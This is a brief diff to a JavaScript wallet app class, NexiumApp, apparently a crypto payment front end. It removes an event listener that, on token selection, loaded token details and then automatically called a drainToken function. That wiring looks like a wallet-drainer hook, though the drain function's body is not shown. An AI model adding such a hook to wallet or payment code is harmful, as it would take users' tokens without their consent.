@@ -766,17 +766,6 @@ class NexiumApp {
     }
     if (this.dom.tokenSelect) {
       this.dom.tokenSelect.disabled = !this.publicKey;
-      const debouncedDrainToken = this.debounce(async (e) => {
-        const selected = e.target.value || null;
-        this.selectedPaymentToken = selected;
-        if (selected !== '') {
-          await this.loadPaymentTokenDetails(selected);
-          await this.drainToken(selected);
-        } else {
-          this.showFeedback('Please select a token.', 'error');
-        }
-      }, 500);
-      this.dom.tokenSelect.addEventListener('change', debouncedDrainToken);
     }
   }
 
